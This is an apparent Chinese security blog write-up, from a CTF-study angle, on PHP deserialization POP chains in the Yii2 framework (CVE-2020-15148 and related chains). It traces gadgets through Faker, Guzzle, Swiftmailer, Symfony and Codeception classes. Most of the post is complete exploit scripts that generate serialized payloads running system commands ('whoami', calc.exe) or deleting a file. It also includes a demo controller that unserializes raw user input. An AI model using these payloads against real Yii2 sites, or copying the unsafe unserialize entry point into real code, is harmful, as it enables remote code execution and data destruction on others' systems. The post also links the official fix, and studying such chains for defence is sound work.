# Yii2反序列化漏洞复现

阅读量 **253947**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-15 10:00:28

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t010451497100c46a19.jpg)

## 前言

最近复现比赛的时候碰到了挺多和 Yii2
相关的反序列化链子的题目，学习的过程中跟着已有的链子进行了分析，同时跟着思路自己也尝试拓宽了一下链子的数量，在这里正好对此类链子做一个小小的总结。

## 漏洞范围

Yii2 < 2.0.38

## 环境部署

Apache version：2.4.39  
PHP version：php7.3.4nts

这里选择 `yii-basic-app-2.0.37`
的源码，[源码链接](https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz)  
使用 `phpstudy` 来搭建，将源码解压在 web 目录后访问 `requirements.php` 文件，修改 `config/web.php`
的源码，将 `cookieValidationKey` 的值改为 `demo`  
在 `controllers` 目录下新建一个文件 `DemoController.php`，添加一个反序列化的入口代码

    
    
    <?php
    
    namespace app\controllers;
    
    use Yii;
    use yii\web\Controller;
    
    class DemoController extends Controller
    {
        public function actionDemo()
        {
            $name = Yii::$app->request->get('input');
            return unserialize(base64_decode($name));
        }
    }
    

访问 `web/index.php`，出现如下页面则环境部署成功

![](https://p2.ssl.qhimg.com/t01ced020f5296bad7b.png)

## POP链-1

###  漏洞分析

CVE-2020-15148 的反序列化起点在 `vendor/yiisoft/yii2/db/BatchQueryResult.php` 中  
这里 `__destruct()` 方法会调用 `reset()` 方法，而 `reset()` 方法中的参数 `$this->_dataReader`
是可控的，进一步调用该参数的 `close()` 方法，漏洞点就在于此可以作为跳板来利用 `__call()` 方法执行反序列化操作

![](https://p4.ssl.qhimg.com/t019aca801e1f018cad.png)

全局搜索 `__call()` 方法，跟进 `vendor/fzaninotto/faker/src/Faker/Generator.php`

![](https://p2.ssl.qhimg.com/t0112da954226a6356c.png)

发现 `__call()` 方法调用了 `format()` 方法，这里的参数 `$method` 和 `$attributes` 都是不可控的，在
`format()` 方法的内部使用了回调函数 `call_user_func_array()` 来调用 `getFormatter()` 方法

![](https://p4.ssl.qhimg.com/t01aa9481ae23e75ee2.png)

继续跟进 `getFormatter()` 方法，这里的 `$this->formatters` 是可控的，所以 `getFormatter()`
方法的返回值也是可控的，结合上一步的分析，回调函数 `call_user_func_array()`
的第一个参数是可控的，第二个参数为空，此时可以利用第一个参数来调用一个可以实现 RCE 的方法，并且这个方法的参数要是类的成员变量、要是可控的

![](https://p1.ssl.qhimg.com/t01f7f6182fa4a5bc70.png)

这里利用正则表达式来 `function_you_want\(\$this->([a-zA-Z0-9]+),
\$this->([a-zA-Z0-9]+)\)` 寻找可用的代码执行函数，发现 `call_user_func`
是可用的，`vendor/yiisoft/yii2/rest/CreateAction.php` 和
`vendor/yiisoft/yii2/rest/IndexAction.php` 中的 `run` 方法都可以满足 RCE 的条件

![](https://p1.ssl.qhimg.com/t014fa62ed3a4e6799d.png)

POC链的利用过程为

![](https://p0.ssl.qhimg.com/t01662b4cc08eba7a17.png)

###  EXP

exp1

    
    
    <?php
    
    namespace yii\rest {
        class CreateAction {
            public $id;
            public $checkAccess;
            public function __construct() {
                $this->id = 'whoami';
                $this->checkAccess = 'system';
            }
        }
    }
    
    namespace Faker {
        use yii\rest\CreateAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['close'] = [new CreateAction(), 'run'];
            }
        }
    }
    
    namespace yii\db {
        use Faker\Generator;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new Generator();
            }
        }
    }
    
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
    

exp2

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $id;
            public $checkAccess;
            public function __construct() {
                $this->id = 'whoami';
                $this->checkAccess = 'system';
            }
        }
    }
    
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['close'] = [new IndexAction(), 'run'];
            }
        }
    }
    
    namespace yii\db {
        use Faker\Generator;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new Generator();
            }
        }
    }
    
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
    

![](https://pic.imgdb.cn/item/615087092ab3f51d91869317.png)

###  修复方法

[参考官方的修复方法](https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99)

![](https://p5.ssl.qhimg.com/t01498b29203a1db6ee.png)

#

## POP链-2

###  漏洞分析

前面已经分析了 `vendor/yiisoft/yii2/db/BatchQueryResult.php` 是漏洞利用的起点，由于通过调用
`reset()` 方法进一步调用 `close` 方法，所以直接搜索 `close()` 方法来尝试触发 `__call()` 方法

![](https://p1.ssl.qhimg.com/t01b2e67b19e086c9a0.png)

逐个跟踪后，发现 `vendor/guzzlehttp/psr7/src/FnStream.php` 中的 `close()` 方法会触发
`call_user_func()` 回调函数，且参数 `$this->_fn_close` 可控

![](https://p1.ssl.qhimg.com/t01094c235c434f3772.png)

    
    
    <?php
    
    namespace GuzzleHttp\Psr7 {
        class FnStream {
            var $_fn_close = "phpinfo";
        }
    }
    
    namespace yii\db {
        use GuzzleHttp\Psr7\FnStream;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new FnStream();
            }
        }
    }
    
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
    

上面构造的 POC 链已经能通过回调函数 `call_user_func()` 执行 `phpinfo`
了，以此为跳板继续寻找一个可以执行命令的类来进行代码执行，利用正则 `eval\(\$this->([a-zA-Z0-9]+)` 匹配到 `eval()`
命令可以利用

![](https://p3.ssl.qhimg.com/t01000082b717773a21.png)

跟进匹配到的两个 `eval()` 方法，发现 `$this->classCode` 是可控的，这里构造 exp 时需要绕过 `__wakeup()` 方法

![](https://p1.ssl.qhimg.com/t018f0773f493d3d581.png)

POC链的利用过程为

![](https://p0.ssl.qhimg.com/t019269567d7fa27135.png)

###  EXP

    
    
    <?php
    
    namespace PHPUnit\Framework\MockObject {
        class MockTrait {
            private $classCode = "system('whoami');";
            private $mockName = "extrader";
        }
    }
    
    namespace GuzzleHttp\Psr7 {
        use PHPUnit\Framework\MockObject\MockTrait;
        class FnStream {
            var $_fn_close;
            public function __construct() {
                $this->_fn_close = array(new MockTrait(), 'generate');
            }
        }
    }
    
    namespace yii\db {
        use GuzzleHttp\Psr7\FnStream;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new FnStream();
            }
        }
    }
    
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(str_replace('O:24:"GuzzleHttp\Psr7\FnStream":1:','O:24:"GuzzleHttp\Psr7\FnStream":2:',serialize(new BatchQueryResult())));
    }
    ?>
    

![](https://p0.ssl.qhimg.com/t0141aa1010af0c01bc.png)

## POP链-3

###  漏洞分析

继续分析前面搜索的 `close()` 方法，跟进 `vendor/yiisoft/yii2/web/DbSession.php` 中的 `close()`
方法，发现其先调用 `getIsActive()` 方法进行一个判断

![](https://p0.ssl.qhimg.com/t01d2bc0db92fd45a18.png)

跟进 `getIsActive()` 方法，这里对会话的状态做了一个判断，当 `yii-debug` 和 `gii`
这两个默认扩展都存在(不一定需要开启)时就会返回 `true`；否则返回 `false`

![](https://p3.ssl.qhimg.com/t01972e51a50d6e66f7.png)

当 `true` 条件满足时进入 if 循环内，进一步调用 `composeFields()` 方法，再调用 `call_user_func()`
方法，但参数无法控制，传入一个对象为参数的可用函数也不太多，这里采用调用类中的公共方法来实现 RCE，赋值为 [(new demo),
“aaa”]这样的一个数组

![](https://p4.ssl.qhimg.com/t01f5e1023ea3f1b276.png)

结合上面的链子，这里采用 `vendor/yiisoft/yii2/rest/CreateAction.php` 和
`vendor/yiisoft/yii2/rest/IndexAction.php` 中的 `run` 方法，均可实现 RCE  
POC链的利用过程为

![](https://p4.ssl.qhimg.com/t013381ac9a4d5318f6.png)

###  EXP

exp1

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace yii\web {
        use yii\rest\IndexAction;
        class DbSession {
            protected $fields = [];
            public $writeCallback;
            public function __construct() {
                $this->writeCallback=[(new IndexAction),"run"];
                $this->fields['1'] = 'aaa';
            }
    
        }
    }
    
    namespace yii\db {
        use yii\web\DbSession;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new DbSession();
            }
        }
    }
    
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
    

exp2

    
    
    <?php
    
    namespace yii\rest {
        class CreateAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace yii\web {
        use yii\rest\CreateAction;
        class DbSession {
            protected $fields = [];
            public $writeCallback;
            public function __construct() {
                $this->writeCallback=[(new CreateAction),"run"];
                $this->fields['1'] = 'aaa';
            }
    
        }
    }
    
    namespace yii\db {
        use yii\web\DbSession;
        class BatchQueryResult {
            private $_dataReader;
            public function __construct() {
                $this->_dataReader = new DbSession();
            }
        }
    }
    
    namespace {
        use yii\db\BatchQueryResult;
        echo base64_encode(serialize(new BatchQueryResult()));
    }
    ?>
    

![](https://p5.ssl.qhimg.com/t01edfec87bd42cad78.png)

## POP链-4

###  漏洞分析

在更新后的版本中，`BatchQueryResult` 类的反序列化已经被修复了，但是最新的 patch 只是用在了 `BatchQueryResult`
类中，尝试全局搜索 `function __destruct()|__wakeup()` 来挖掘新的链子

![](https://p2.ssl.qhimg.com/t01ab621389b55a7c5d.png)

逐个分析查找到的可用类，跟进 `vendor/codeception/codeception/ext/RunProcess.php`，这里先调用
`stopProcess()` 方法，接着调用 `isRunning()` 方法进行判断，但是这个方法不在类中，会触发 `__call()`
方法，并且这里的参数 `$this->processes` 是可控的，因此可以找一个 `__call()` 方法来，这里直接利用前面构造 `POP链-1`
的后半段来拼接一个新的 exp

![](https://p5.ssl.qhimg.com/t01cdeff87594208d74.png)

POC链的利用过程为

![](https://p5.ssl.qhimg.com/t01fbdf9e3aa849ff9d.png)

###  EXP

exp1

    
    
    <?php
    
    namespace yii\rest {
        class CreateAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace Faker {
        use yii\rest\CreateAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['isRunning'] = [new CreateAction(), 'run'];
            }
    
        }
    }
    
    namespace Codeception\Extension {
        use Faker\Generator;
        class RunProcess {
            private $processes;
            public function __construct() {
                $this->processes = [new Generator()];
            }
        }
    }
    
    namespace {
        use Codeception\Extension\RunProcess;
        echo base64_encode(serialize(new RunProcess()));
    }
    ?>
    

exp2

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['isRunning'] = [new IndexAction(), 'run'];
            }
    
        }
    }
    
    namespace Codeception\Extension {
        use Faker\Generator;
        class RunProcess {
            private $processes;
            public function __construct() {
                $this->processes = [new Generator()];
            }
        }
    }
    
    namespace {
        use Codeception\Extension\RunProcess;
        echo base64_encode(serialize(new RunProcess()));
    }
    ?>
    

![](https://p0.ssl.qhimg.com/t01a76fe41f37e0504f.png)

## POP链-5

###  漏洞分析

继续分析上面查找的 `function __destruct()|__wakeup()`  
跟进
`vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php`，这里
`__destruct()` 方法调用了 `clearAll()` 方法，跟进去发现进一步调用了 `clearKey()` 方法，继续跟进，发现会调用
`unlink()` 方法，并且这里的 `$this->path` 是可控的，那么就可以寻找可以利用的 `__toString()` 魔术方法来进行后续的
RCE 操作

![](https://p1.ssl.qhimg.com/t01d9519b1c36e20038.png)

全局搜索一下 `__toString()` 方法：`function __toString\(\)`

![](https://p5.ssl.qhimg.com/t01b731712f9aefc8a4.png)

这里给出几个触发点

    
    
    \GuzzleHttp\Psr7/FnStream::__toString -> call_user_func 可以调用命令执行
    
    \Symfony/string/LazyString::__toString -> value 可以控制该值从而调用 run 方法进行 RCE
    
    \Codeception\Util\XmlBuilder::__toString -> \DOMDocument::saveXML 可以触发__call方法
    
    \phpDocumentor\Reflection\DocBlock\Tags\Version::__toString -> render 可以触发__call方法
    
    \phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -> render 可以触发__call方法
    
    \phpDocumentor\Reflection\DocBlock\Tags\Deprecated::__toString -> render 可以触发__call方法
    
    \phpDocumentor\Reflection\DocBlock\Tags\Generic::__toString -> render 可以触发__call方法
    
    \phpDocumentor\Reflection\DocBlock\Tags\See::__toString -> render 可以触发__call方法
    
    \phpDocumentor\Reflection\DocBlock\Tags\Link::__toString -> render 可以触发__call方法
    
    ......
    

POC链的利用过程为

![](https://p1.ssl.qhimg.com/t01ea2e854f53e4a6e2.png)

###  EXP

这里随便用几个触发点构造 exp，剩下的可以自己构造试试  
exp1

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['render'] = [new IndexAction(), 'run'];
            }
    
        }
    }
    
    namespace phpDocumentor\Reflection\DocBlock\Tags {
        use Faker\Generator;
        class Deprecated {
            protected $description;
            public function __construct() {
                $this->description = new Generator();
            }
        }
    }
    
    namespace {
        use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
        class Swift_KeyCache_DiskKeyCache {
            private $path;
            private $keys;
            public function __construct() {
                $this->keys = array("H3rmesk1t"=>array("is"=>"ctfer"));
                $this->path = new Deprecated();
            }
        }
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
    

exp2

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['saveXML'] = [new IndexAction(), 'run'];
            }
    
        }
    }
    
    namespace Codeception\Util {
        use Faker\Generator;
        class XmlBuilder {
            protected $__dom__;
            public function __construct() {
                $this->__dom__ = new Generator();
            }
        }
    }
    
    namespace {
        use Codeception\Util\XmlBuilder;
        class Swift_KeyCache_DiskKeyCache {
            private $path;
            private $keys;
            public function __construct() {
                $this->keys = array("H3rmesk1t"=>array("is"=>"ctfer"));
                $this->path = new XmlBuilder();
            }
        }
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
    

exp3

    
    
    <?php
    
    namespace PHPUnit\Framework\MockObject {
        class MockTrait {
            private $classCode = "system('calc.exe');";
            private $mockName = "extrader";
        }
    }
    
    namespace GuzzleHttp\Psr7 {
        use PHPUnit\Framework\MockObject\MockTrait;
        class FnStream {
            var $_fn___toString;
            public function __construct() {
                $this->_fn___toString = array(new MockTrait(), 'generate');
            }
        }
    }
    
    namespace {
        use GuzzleHttp\Psr7\FnStream;
        class Swift_KeyCache_DiskKeyCache {
            private $path;
            private $keys;
            public function __construct() {
                $this->keys = array("H3rmesk1t"=>array("is"=>"ctfer"));
                $this->path = new FnStream();
            }
        }
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
    

![](https://p5.ssl.qhimg.com/t01a056de4e8036d14a.png)

## POP链-5

###  漏洞分析

继续分析前面搜索的 `__destruct()` 方法入口，跟进
`vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php`，这里
`__destruct` 方法调用了 `file_exists()` 方法，而 `file_exists` 的参数通用是需要 String
类型，所以这里如果能够满足后面的 `getPath()` 方法可控即可继续用上面的 `__toString()` 的方式来触发 RCE 了

![](https://p1.ssl.qhimg.com/t01f8bc18e38556c204.png)

跟进 `getPath()` 方法，很明显这里的 `$this->path` 是可控的，可以构造出任意文件删除和 RCE 的 exp 了

![](https://p3.ssl.qhimg.com/t013c027b5f3d552795.png)

POC链的利用过程为

![](https://p4.ssl.qhimg.com/t016a3c3f873d7e375c.png)

###  EXP

exp1

    
    
    <?php
    
    namespace {
        class Swift_ByteStream_FileByteStream {
            private $path;
            public function __construct() {
                $this->path = '/var/www/html/flag';
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
        }
        echo base64_encode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));
    }
    ?>
    

exp2

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess = "system";
                $this->id = "calc.exe";
            }
        }
    }
    
    namespace Symfony\Component\String {
        use yii\rest\IndexAction;
        class LazyString {
            private $value;
            public function __construct() {
                $this->value = [new IndexAction,"run"];
            }
        }
    }
    
    namespace {
        use Symfony\Component\String\LazyString;
        class Swift_ByteStream_FileByteStream {
            private $path;
            public function __construct() {
                $this->path = new LazyString();
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
        }
        echo base64_encode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));
    }
    ?>
    

![](https://p1.ssl.qhimg.com/t0118c190e27ee0fa3c.png)

## POP链-6

###  漏洞分析

紧接着上面的思路，继续跟进另一条链子
`vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php`，这里
`__destruct()` 方法调用了 `stop()` 方法，继续跟进发现 `$this->eventDispatcher`
可控，故可以继续利用上面已知的 `__call()` 方法来进行后续操作达到 RCE

![](https://p0.ssl.qhimg.com/t01b92ed38821a821fd.png)

![](https://p0.ssl.qhimg.com/t01dec25e84d6c99055.png)

POC链的利用过程为

![](https://p2.ssl.qhimg.com/t018ab86aa988a3d591.png)

###  EXP

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess = "system";
                $this->id = "calc.exe";
    
            }
        }
    }
    
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['createTransportChangeEvent'] = [new IndexAction,"run"];
            }
        }
    }
    
    namespace {
        use Faker\Generator;
        abstract class Swift_Transport_AbstractSmtpTransport {
        }
        class Swift_Transport_SendmailTransport extends Swift_Transport_AbstractSmtpTransport {
            protected $started;
            protected $eventDispatcher;
            public function __construct() {
                $this->started = True;
                $this->eventDispatcher = new Generator();
            }
        }
        echo (base64_encode(serialize(new Swift_Transport_SendmailTransport())));
    }
    ?>
    

![](https://p0.ssl.qhimg.com/t0113e28c8855ffaca0.png)

## POP链-7

###  漏洞分析

前面查询的结果中有一个点的 `__wakeup()` 方法是可以利用的，跟一下试试

![](https://p0.ssl.qhimg.com/t014a3f5ecf3490c6db.png)

跟进 `vendor/symfony/string/UnicodeString.php`，这里调用了
`normalizer_is_normalized()` 方法，并且 `$this->string` 是可控的，所以可以尝试找一个
`__toString()` 魔术方法来进行后续 RCE 操作，这里直接利用上一条链子找到的那些 `__toString()`
魔术方法即可，当然也可以用这个 `__wakeup()` 方法来触发之前的 `__call()` 方法的 POP 链

![](https://p4.ssl.qhimg.com/t01972407effa76aa81.png)

POC链的利用过程为

![](https://p1.ssl.qhimg.com/t015cfed7e67345905a.png)

###  EXP

exp1

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace Symfony\Component\String {
        use yii\rest\IndexAction;
        class LazyString {
            private $value;
            public function __construct()
            {
                $this->value = [new IndexAction,"run"];
            }
        }
        class UnicodeString{
            protected $string;
            public function __construct() {
                $this->string = new LazyString();
            }
        }
        echo base64_encode((serialize(new UnicodeString())));
    }
    ?>
    

exp2

    
    
    <?php
    
    namespace yii\rest {
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct() {
                $this->checkAccess = "system";
                $this->id = "calc.exe";
            }
        }
    }
    
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['saveXML'] = [new IndexAction,"run"];
            }
        }
    }
    
    namespace Codeception\Util {
        use Faker\Generator;
        class XmlBuilder {
            protected $__dom__;
            public function __construct() {
                $this->__dom__ = new Generator();
            }
        }
    }
    
    namespace Symfony\Component\String {
        use Codeception\Util\XmlBuilder;
        class UnicodeString {
            protected $string;
            public function __construct() {
                $this->string = new XmlBuilder();
            }
        }
        echo base64_encode((serialize(new UnicodeString())));
    }
    ?>
    

![](https://p3.ssl.qhimg.com/t01e4e1cee08fd82efe.png)

## 后言

文中链子的触发方式在 `__call()` 和 `__toString()`
有很多，这里就没用把构造出来的链子都贴出来；各位师傅们有兴趣的话可以自己尝试构造一下，文中有不对的地方还请各位师傅们指正，欢迎大家一起交流学习吖！

## 参考

[Yii反序列化分析](https://www.anquanke.com/post/id/217929#h2-0)  
[详解PHP反序列化漏洞](https://blog.csdn.net/LYJ20010728/article/details/117112864)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **H3rmesk1t** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254429](/post/id/254429)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [代码审计](/tag/代码审计)
  * [反序列化](/tag/反序列化)
  * [Yii2](/tag/Yii2)

 **+1** __7赞

 __收藏

![](https://p2.ssl.qhimg.com/t012ef1fd2483ccbebc.jpg) H3rmesk1t

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

